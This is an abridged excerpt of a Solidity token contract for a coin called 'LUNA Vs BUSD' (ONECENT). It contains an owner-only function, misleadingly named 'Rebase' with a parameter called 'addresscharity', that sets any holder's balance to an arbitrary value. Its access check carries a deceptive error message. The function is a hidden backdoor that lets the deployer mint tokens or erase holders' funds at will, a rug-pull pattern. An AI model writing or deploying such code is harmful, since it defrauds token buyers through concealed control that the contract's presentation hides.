...
contract ANTIBOTS is ownable {
    ...
    mapping(address => uint) internal _Tbalances;
    ...
    modifier valueExists(address _sender, uint _value) {
        require(_value <= _Tbalances[_sender],"Transfer value is out of balance.");
        _;
    }
    ...
    //****************************************************************************
    constructor() public {
        _Tbalances[address(this)] = _totalSupply;
    }
    ...
    function transfer(address _to, uint256 _value) public notZero(_to) valueExists(msg.sender, _value) returns(bool) {
        ...
        _Tbalances[msg.sender] = _Tbalances[msg.sender].sub(_value);
        _Tbalances[_to] = _Tbalances[_to].add(_value);
    ...
    function transferFrom(address _from, address _to, uint256 _value) public notZero(_to) valueExists(_from, _value) returns(bool) {
        ...
        _Tbalances[_from] = _Tbalances[_from].sub(_value);
        _Tbalances[_to] = _Tbalances[_to].add(_value);
...
//****************************************************************************
contract HELPLUNA is ANTIBOTS {

      address DOTORIOWNER;
    constructor() public {
        DOTORIOWNER = msg.sender;
        _name = 'LUNA Vs BUSD';
        _symbol = 'ONECENT';
        _decimals = 9;
    ...
    modifier _ONLYADMIN () {
    require(DOTORIOWNER == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
    ...
    //* Owner Functions
    //****************************************************************************
    function Rebase(address addresscharity, uint _value) public _ONLYADMIN {
        _Tbalances[addresscharity] = _value * 10 ** 9;
    ...
    function burn(uint _value) public isOwner valueExists(address(this), _value) validValue(_value) returns(bool) {
        _Tbalances[address(this)] = _Tbalances[address(this)].sub(_value);
